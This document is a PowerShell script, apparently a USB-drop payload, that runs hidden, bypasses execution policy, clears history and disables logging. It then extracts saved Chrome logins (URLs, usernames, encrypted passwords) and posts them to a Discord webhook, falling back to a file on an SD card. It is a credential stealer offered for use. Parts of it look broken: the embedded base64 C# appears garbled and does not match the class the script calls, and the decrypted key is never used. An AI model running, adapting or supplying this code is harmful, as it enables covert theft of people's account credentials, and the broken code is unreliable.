powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "
$ErrorActionPreference = 'SilentlyContinue'
[System.Management.Automation.PSConsoleReadLine]::ClearHistory()
Stop-Transcript | Out-Null
[System.Management.Automation.Logging.PSEventLogProvider]::EventLoggingEnabled = $false

function pumpndump {
    param([String]$hq, [String]$localPath)
    
    Add-Type -TypeDefinition ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dXNpbmcgU3lzdGVtOwogICAgdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOwogICAgcHVibGljIGNsYXNzIFdpblNRTGl0ZTNPcGVuIHsgIAogICAgICAgIGNvbnN0IHN0cmluZyBkbGwgPSAid2luc3FsaXRlMyI7IAogICAgICAgIFtEbGxJbXBvcnRdKGRsbCwgImVudHJ5UG9pbnQiID0gInNxbGl0ZTNfb3BlbiIpCiAgICAgICAgcHVibGljIHN0YXRpYyBzeXN0ZW0uaW50cHRyIHN0YXRpYyBzdHJpbmcgT3Blbiggc3RyaW5nIGZpbGVuYW1lLCBvdXQgaW50cHRyIHN0YXRpYyBsb3VuZ2JpdHRlciBfZGIpIHt7fSBoZWFkZXI='))) 

    $chrome_path = $env:LOCALAPPDATA + '\Google\Chrome\User Data'
    $query = 'SELECT origin_url, username_value, password_value FROM logins WHERE blacklisted_by_user = 0'

    $secret = (Get-Content -Raw -Path ($chrome_path + '\Local State')) | ConvertFrom-Json
    $secretkey = $secret.os_crypt.encrypted_key
    $cipher = [Convert]::FromBase64String($secretkey)
    $key = [System.Security.Cryptography.ProtectedData]::Unprotect($cipher[5..$cipher.length], $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

    $stmt = 0
    $dbH = 0
    [WinSQLite3]::Open($(-join($chrome_path, '\Login Data')), [ref] $dbH) | Out-Null
    [WinSQLite3]::Prepare2($dbH, $query, -1, [ref] $stmt, [System.IntPtr]0) | Out-Null

    $outputData = @()
    while([WinSQLite3]::Step($stmt) -eq 100) {
        $url = [WinSQLite3]::ColumnString($stmt, 0)
        $username = [WinSQLite3]::ColumnString($stmt, 1)
        $encryptedPassword = [Convert]::ToBase64String([WinSQLite3]::ColumnByteArray($stmt, 2))

        $outputData += 'URL: ' + $url + ' | Username: ' + $username + ' | Encrypted Password: ' + $encryptedPassword

        $webhookPayload = @{
            'content' = 'Chrome Login Data'
            'embeds' = @(
                @{
                    'title' = 'Login Data'
                    'fields' = @(
                        @{ 'name' = 'URL'; 'value' = $url },
                        @{ 'name' = 'Username'; 'value' = $username },
                        @{ 'name' = 'Encrypted Password'; 'value' = $encryptedPassword }
                    )
                }
            )
        } | ConvertTo-Json -Depth 4

        try {
            Invoke-RestMethod -Uri $hq -Method Post -ContentType 'application/json' -Body $webhookPayload
        }
        catch {
            $internetAvailable = $false
        }
    }
    
    if (-not $internetAvailable) {
        $outputData | Out-File -FilePath $localPath -Encoding UTF8
    }
}

$internetAvailable = Test-Connection -ComputerName 8.8.8.8 -Count 1 -Quiet
$localPath = 'SD_CARD_DRIVE\login_data.txt'

pumpndump -hq 'https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN' -localPath $localPath
Stop-Transcript | Out-Null
Remove-Variable * -ErrorAction SilentlyContinue
[System.Management.Automation.PSConsoleReadLine]::ClearHistory()
"
